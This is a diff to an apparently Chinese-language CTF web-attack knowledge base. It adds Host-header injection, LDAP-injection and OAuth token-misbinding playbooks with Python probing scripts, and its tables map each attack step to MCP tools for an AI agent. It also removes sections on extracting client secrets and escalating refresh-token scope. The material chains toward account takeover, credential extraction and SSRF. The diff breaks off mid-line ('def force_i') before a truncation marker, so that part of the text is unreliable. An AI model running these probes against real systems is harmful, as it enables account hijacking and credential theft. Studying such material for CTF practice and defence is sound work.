@@ -1650,6 +1650,68 @@ Host 头被后端用于:
 └── 密码重置 token 邮箱链接
 ```
 
+### 0.1 Host 到身份/回调/缓存 Oracle
+
+Host 头不是单点技巧，它通常影响“绝对 URL 生成”和“上游代理取值”。先把所有会生成 URL 的功能列成矩阵：密码重置、邮箱验证、OAuth callback、支付 webhook、文件下载签名、Sitemap、缓存响应。命中后立刻看 token、code、sign、cache key 和 SSRF 目标是否跟着 Host 变化。
+
+| 功能 | Host 影响字段 | 成功 oracle | 下一跳 |
+|---|---|---|---|
+| 密码重置/邮箱验证 | reset link、verify link | 邮件/预览 URL 指向攻击者 host | 账号接管 |
+| OAuth/OIDC | issuer、redirect_uri、callback URL | code/state 回到错 host | OAuth、JWT |
+| 支付 webhook | `notify_url`, `return_url`, absolute callback | 回调地址或签名 base URL 变化 | 支付异步链 |
+| 文件下载 | signed URL、CDN URL | sign 覆盖路径但不覆盖 host | 签名、文件下载 |
+| SSRF/服务发现 | 内部 health URL | Host 变内网后响应差异 | SSRF |
+| Cache | `Location`, canonical, OpenGraph | 缓存命中不同 Host 内容 | Cache deception/smuggling |
+
+Host oracle 执行器：
+
+```python
+# host_absolute_url_oracle.py
+import csv
+import hashlib
+import re
+from pathlib import Path
+import requests
+
+OVERRIDES = ["Host", "X-Forwarded-Host", "X-Host", "X-Original-Host", "X-Forwarded-Server"]
+URL_RX = re.compile(r"https?://[^\s\"'<>]+", re.I)
+
+def probe_host_oracle(url, evil="attacker.example", normal="target.example"):
+    base = requests.get(url, headers={"Host": normal}, timeout=8, allow_redirects=False)
+    rows = []
+    for header in OVERRIDES:
+        headers = {"Host": normal}
+        headers[header] = evil
+        if header == "Host":
+            headers = {"Host": evil}
+        r = requests.get(url, headers=headers, timeout=8, allow_redirects=False)
+        urls = URL_RX.findall(r.text[:4000] + "\n" + "\n".join(f"{k}: {v}" for k, v in r.headers.items()))
+        rows.append({
+            "header": header,
+            "status": r.status_code,
+            "length": len(r.text),
+            "location": r.headers.get("Location", ""),
+            "evil_reflected": evil in r.text or evil in r.headers.get("Location", ""),
+            "body_sha1": hashlib.sha1(r.content[:2048]).hexdigest()[:12],
+            "absolute_urls": "|".join(urls[:6]),
+            "baseline_delta": len(r.text) - len(base.text),
+        })
+    Path("exports").mkdir(exist_ok=True)
+    with open("exports/host_absolute_url_oracle.csv", "w", newline="", encoding="utf-8") as f:
+        w = csv.DictWriter(f, fieldnames=rows[0].keys())
+        w.writeheader()
+        w.writerows(rows)
+    return rows
+```
+
+执行节奏：
+
+1. 先打普通页面和会发邮件/回调的功能，比较 `Location`、HTML 绝对 URL、JSON `baseUrl`。
+2. 命中 OAuth/OIDC 时保留 `state/code/issuer`，转 `oauth-sso.md` 做 callback 错配。
+3. 命中支付回调/下载签名时保留签名原文，转签名和支付异步文档。
+4. 命中内网 Host 响应差异时，把 Host 作为 SSRF 入口继续扫 metadata、Redis、内部 API。
+5. 命中缓存头时记录 `Age/X-Cache/CF-Cache-Status`，转缓存链。
+
 ## 1. 密码重置劫持
 
 ```python
@@ -1818,12 +1880,15 @@ AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：
 |---------|---------|------|
 | Host header 注入探测 | `http_probe` | HTTP GET 探测，验证 Host header 篡改效果 |
 | 路由绕过验证 | `http_probe` | 探测 X-Forwarded-Host/X-Real-IP 等 header 效果 |
+| 按信号路由 | `kb_router` | 命中 OAuth、SSRF、Cache、支付回调后跳转文档 |
+| 执行脚本 | `run_ctf_tool` | 跑 Host oracle、缓存差分、回调 URL 变体 |
 
 ## Evidence
 
 - 保存 baseline、每个 header 变体、响应状态、`Location`、正文里出现的绝对 URL。
 - 对密码重置/邮箱验证记录：触发请求、邮件/预览里的最终链接、token 所属账号、token 是否可用。
 - 对 cache 场景记录：缓存命中头、cache key 推断、首个投毒请求和后续命中请求。
+- 新增 `host_absolute_url_oracle.csv`：header 名、反射点、绝对 URL、响应 hash、baseline 差异和下一跳。
 - 输出统一放入 `exports/ctf-website/<case>/`，自动检索 `flag{}`、`CTF{}`、`DASCTF{}`。
 
 
@@ -4560,6 +4625,65 @@ Source: https://github.com/LING71671/open-reverselab/blob/main/kb/ctf-website/te
 
 # LDAP Injection
 
+## 0. 目录字段到身份/权限路线图
+
+LDAP 注入的目标不是只让登录成功，而是把目录字段转成身份、组、凭据和后台权限。CTF 里最短路径通常是：判断 filter 形态 → 扩展 OR/通配 → 抽 `mail/memberOf/userPassword/description` → 回到 Web 登录、SSO、后台或 API token。
+
+| 目录信号 | 关键属性 | 第一动作 | 下一跳 |
+|---|---|---|---|
+| 登录 filter | `uid`, `mail`, `sAMAccountName` | 闭合值、扩展 OR 分支 | Auth bypass |
+| 组/角色 | `memberOf`, `gidNumber`, `role`, `description` | 枚举 admin/ops/dev 组 | BAC、后台入口 |
+| 凭据 | `userPassword`, `unicodePwd`, `pwdLastSet` | 前缀盲注或匿名 bind | 凭据复用、限速绕过 |
+| SSO 绑定 | `mail`, `eduPersonPrincipalName`, `sub` | 邮箱/NameID 错绑 | OAuth/SAML |
+| 配置/服务 | `labeledURI`, `host`, `sshPublicKey` | 找内部 URL 和 key | SSRF、配置泄露 |
+| Flag/业务字段 | `info`, `description`, 自定义属性 | 属性存在/前缀抽取 | CTF 目标字段 |
+
+目录字段路由器：
+
+```python
+# ldap_attribute_router.py
+import csv
+import re
+from pathlib import Path
+
+ROUTES = {
+    "identity": re.compile(r"uid|cn|mail|sAMAccountName|userPrincipalName|eduPerson", re.I),
+    "group": re.compile(r"memberOf|gidNumber|group|role|admin|ops|dev", re.I),
+    "credential": re.compile(r"userPassword|unicodePwd|pwdLastSet|shadow|sshPublicKey", re.I),
+    "service": re.compile(r"labeledURI|host|url|endpoint|database|ldap", re.I),
+    "flag": re.compile(r"flag\{|CTF\{|DASCTF\{|description|info", re.I),
+}
+
+def route_ldif(path, out="exports/ldap_attribute_routes.csv"):
+    rows = []
+    current_dn = ""
+    for line in open(path, encoding="utf-8", errors="ignore"):
+        line = line.rstrip("\n")
+        if line.startswith("dn: "):
+            current_dn = line[4:]
+        if ":" not in line:
+            continue
+        attr, value = line.split(":", 1)
+        text = f"{attr} {value}"
+        hits = [name for name, rx in ROUTES.items() if rx.search(text)]
+        if hits:
+            rows.append({"dn": current_dn, "attribute": attr, "routes": ",".join(hits), "sample": value.strip()[:160]})
+    Path(out).parent.mkdir(parents=True, exist_ok=True)
+    with open(out, "w", newline="", encoding="utf-8") as f:
+        w = csv.DictWriter(f, fieldnames=["dn", "attribute", "routes", "sample"])
+        w.writeheader()
+        w.writerows(rows)
+    return rows
+```
+
+执行节奏：
+
+1. 先用错误和结果数判断 filter 形态，不要盲目套万能 payload。
+2. 登录口命中后，马上测搜索/通讯录/SSO 绑定口，找更稳定的结果 oracle。
+3. 抽到 `mail/memberOf` 后转 OAuth/SAML/后台角色链；抽到 `userPassword` 后转凭据喷射/限速文档。
+4. 抽到 `labeledURI/host` 后转 SSRF 或配置泄露；抽到 `description/info` 先查 flag/业务 secret。
+5. 所有盲注都保留前缀推进日志，避免把随机页面长度误判成目录命中。
+
 ## LDAP 过滤器注入
 
 ```python
@@ -4747,7 +4871,7 @@ LDAP filter injection → (&(uid=*)(memberOf=cn=admin,ou=groups)) → 提权
 
 ## Evidence
 
-记录: 原始 filter 形态推断、payload、响应差异、搜索结果数量、盲注字符日志、提取出的属性值、LDAP banner/base DN、JNDI 外连日志、成功样本和失败样本。
+记录: 原始 filter 形态推断、payload、响应差异、搜索结果数量、盲注字符日志、提取出的属性值、LDAP banner/base DN、JNDI 外连日志、`ldap_attribute_routes.csv` 字段路由、成功样本和失败样本。
 
 ## MCP 工具映射
 
@@ -4756,6 +4880,9 @@ AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：
 | 攻击步骤 | MCP 工具 | 说明 |
 |---------|---------|------|
 | LDAP 注入端点探测 | `http_probe` | HTTP GET 探测 LDAP 查询端点 |
+| 按信号路由 | `kb_router` | 命中 OAuth、BAC、配置、限速信号后跳转文档 |
+| 读取技术文件 | `kb_read_file` | 读取 LDAP、SSO、限速、配置链路细节 |
+| 执行脚本 | `run_ctf_tool` | 跑 LDAP 前缀抽取、LDIF 字段路由、结果数 oracle |
 
 
 ---
@@ -4779,6 +4906,76 @@ OAuth 流程四阶段，每阶段都有攻击点:
               │ state/nonce   │ reuse     │  aud 缺失
               │ PKCE          │           │
 ```
+
+### 0.1 Flow 字段绑定到 Token/API Oracle
+
+OAuth/OIDC 的核心是字段绑定关系。每个 `code/state/nonce/redirect_uri/client_id/aud/iss/sub/scope` 都要落到一个可观察 oracle：能否换 token、token 能访问哪个 API、是否能触发支付/订单/后台动作。
+
+| 字段 | 绑定对象 | 错配实验 | 成功 oracle | 下一跳 |
+|---|---|---|---|---|
+| `redirect_uri` | client + code | 同 client 换 path/host/open redirect | code/token 到攻击者回调 | Host Header、Open Redirect |
+| `state` | browser session | 固定/空/跨 session | login CSRF、账号错绑 | Replay/nonce |
+| `nonce` | id_token + session | 重放旧 id_token | id_token 被接受 | JWT |
+| `code` | client + redirect + PKCE | 跨 client/跨 session 换 token | token endpoint 返回 access_token | 签名/重放 |
+| `aud`/`azp` | API/client | ID token 调 API、换 client | API 接受错 token | BAC/IDOR |
+| `scope` | client grant | refresh 扩权、device flow 扩权 | 新 token scope 增加 | 业务权限 |
+| `email`/`sub`/`iss` | 用户身份 | 同邮箱跨 IdP | 账号绑定到错误主体 | LDAP/SAML |
+
+Token oracle 记录器：
+
+```python
+# oauth_token_oracle_matrix.py
+import base64
+import csv
+import json
+from pathlib import Path
+import requests
+
+def decode_jwt(token):
+    parts = token.split(".")
+    if len(parts) < 2:
+        return {}
+    payload = parts[1] + "=" * (-len(parts[1]) % 4)
+    return json.loads(base64.urlsafe_b64decode(payload.encode()))
+
+def call_api(api_url, token):
+    r = requests.get(api_url, headers={"Authorization": f"Bearer {token}"}, timeout=10)
+    return {"status": r.status_code, "length": len(r.text), "sample": r.text[:180].replace("\n", "\\n")}
+
+def record_tokens(cases, api_url, out="exports/oauth_token_oracle_matrix.csv"):
+    rows = []
+    for name, token in cases.items():
+        claims = decode_jwt(token)
+        api = call_api(api_url, token)
+        rows.append({
+            "case": name,
+            "iss": claims.get("iss", ""),
+            "sub": claims.get("sub", ""),
+            "aud": claims.get("aud", ""),
+            "azp": claims.get("azp", ""),
+            "scope": claims.get("scope", ""),
+            "api_status": api["status"],
+            "api_length": api["length"],
+            "api_sample": api["sample"],
+        })
+    Path(out).parent.mkdir(parents=True, exist_ok=True)
+    with open(out, "w", newline="", encoding="utf-8") as f:
+        if not rows:
+            f.write("case,iss,sub,aud,azp,scope,api_status,api_length,api_sample\n")
+            return []
+        w = csv.DictWriter(f, fieldnames=rows[0].keys())
+        w.writeheader()
+        w.writerows(rows)
+    return rows
+```
+
+执行节奏：
+
+1. 先抓完整 authorize/token/userinfo/API 四段请求，建立 baseline。
+2. 对 redirect_uri/state/nonce/PKCE/code/client_id 单变量错配，记录每次 token endpoint 结果。
+3. 每个 access_token/id_token 都跑 `oauth_token_oracle_matrix.csv`，看 API 是否接受错类型 token。
+4. 命中 `aud/azp/scope` 错配后，转 BAC/订单/支付 API，看权限是否扩大。
+5. 命中 `email/sub/iss` 错绑后，转 LDAP/SAML/JWT 文档补身份源链。
 
 ## 1. redirect_uri 攻击
 
@@ -5019,90 +5216,9 @@ def token_oracle(token, endpoints):
 # 3. 如果没验证 redirect_uri → 直接拿 token
 
 # 强制 implicit flow (如果 authorization_code 受限)
-def force_implicit(client_id: str, redirect_uri: str):
-    return requests.get("https://target.com/oauth/authorize", params={
-        "response_type": "token",      # ← implicit 模式
-        "client_id": client_id,
-        "redirect_uri": redirect_uri,
-        "scope": "openid profile admin",
-        "state": "x"
-    })
-```
+def force_i
 
-## 8. Client Secret 提取
-
-```bash
-# 常见泄露位置:
-# 1. JS 源码硬编码
-grep -r "client_secret\|clientSecret\|CLIENT_SECRET" --include="*.js" .
-# 2. 移动端 APK 反编译
-strings app.apk | grep -i "client_secret\|secret"
-# 3. Source maps / .map 文件
-# 4. Public config endpoints: /config, /env, /.env
-# 5. Git 历史
-git log -p | grep -i "client_secret"
-
-# 拿到 client_secret 后 → 可进行 confidential client 的所有操作
-```
-
-## 9. Device Code Flow 滥用
-
-```python
-# Device Code Flow (设备授权) — 适用于 TV/IoT
-# 如果未限制 device_code 速率:
-# 1. 持续尝试 user_code → 可能暴力猜解
-# 2. 短间隔轮询 → 等待用户输入后立即换取 token
-# https://target.com/oauth/device/code
-```
-
-### 9.1 Refresh Token / Scope 变形
-
-```bash
-# scope 扩权尝试
-curl -X POST "$TOKEN" \
-  -d "grant_type=refresh_token&refresh_token=$RT&client_id=$CID&scope=openid profile email admin offline_access"
-
-# client 混用
-curl -X POST "$TOKEN" \
-  -d "grant_type=refresh_token&refresh_token=$RT&client_id=other_client"
-```
-
-判断点：
-
-- 新 access_token 的 `scope` 是否比原 token 多。
-- refresh_token 是否可跨 client 使用。
-- `azp`、`aud`、`iss` 是否和当前 API 匹配。
-- refresh 后旧 access_token 是否仍可用。
-
-## 工具命令
-
-```bash
-# 完整 OAuth 流程抓取
-curl -v "https://target.com/oauth/authorize?response_type=code&client_id=xxx&redirect_uri=https://callback&scope=openid%20profile&state=x"
-curl -X POST "https://target.com/oauth/token" -d "grant_type=authorization_code&code=xxx&client_id=xxx&redirect_uri=https://callback"
-curl -X POST "https://target.com/oauth/token" -d "grant_type=refresh_token&refresh_token=xxx&client_id=xxx"
-curl -X POST "https://target.com/oauth/token" -d "grant_type=client_credentials&client_id=xxx&client_secret=xxx"
-python3 jwt_tool.py <id_token>
-curl https://target.com/.well-known/openid-configuration | jq .
-```
-
-## Evidence
-
-记录: 完整流程每个 HTTP 请求/响应、authorize 参数、redirect_uri payload、code 与 token 交换结果、PKCE verifier/challenge、id_token/access_token/refresh_token 的 claims、client_secret 来源、token 能访问的 API 和失败样本。
-
-## MCP 工具映射
-
-AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：
-
-| 攻击步骤 | MCP 工具 | 说明 |
-|---------|---------|------|
-| OAuth endpoint 探测 | `http_probe` | HTTP GET 探测 OAuth/SSO 端点 |
-| 知识检索 | `kb_router` | 按攻击信号搜索知识库相关技术 |
-| 知识库文件读取 | `kb_read_file` | 读取知识库技术文件内容 |
-
-## 工作流
-
-建立 baseline → 抓完整 authorize/token/userinfo/API 请求 → 确认字段绑定关系 → 对 redirect_uri/state/nonce/PKCE/aud/iss 做单变量错配 → 用 token oracle 验证权限变化 → 保存成功样本和失败样本。
+[... content truncated for size ...]
 
 
 ---
